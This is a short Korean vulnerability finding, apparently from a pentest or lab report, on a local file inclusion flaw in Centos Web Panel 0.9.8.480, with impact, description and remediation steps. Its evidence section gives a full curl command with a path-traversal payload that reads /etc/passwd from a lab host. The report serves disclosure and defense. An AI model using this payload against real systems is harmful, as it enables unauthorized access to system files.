## Centos Web Panel 0.9.8.480 - Local File Inclusion
- **End-Point**: `http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php/admin/index.php`
- **영향**: 취약점 악용 성공 시 공격자가 서버 내의 민감한 파일을 읽을 수 있으며, 이는 시스템 정보 유출 및 추가 공격의 수단으로 활용될 수 있음.
- **설명**: Centos Web Panel 0.9.8.480 버전에서 로컬 파일 포함(LFI) 취약점이 발생함. `file` 파라미터에 대한 입력값 검증 부재로 인해 상위 디렉토리 이동 구문(`../`)을 사용하여 시스템 파일에 접근이 가능함.
- **근거**: 다음과 같이 `curl` 명령어를 사용하여 `/etc/passwd` 파일 읽기를 시도하는 재현 코드가 확인됨.
`curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.1 Safari/605.1.15' 'http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php/admin/index.php?module=file_editor&file=/../../../../../../../../../../../etc/passwd'`
- **대응**: Centos Web Panel을 해당 취약점이 해결된 최신 버전으로 업데이트하고, 애플리케이션 수준에서 사용자 입력값에 대한 경로 탐색 문자열 필터링을 적용해야 함.
- **조치**: 소프트웨어 업데이트를 즉시 실시하고, 웹 서버 권한을 최소화하여 민감한 시스템 파일에 대한 접근을 차단함.
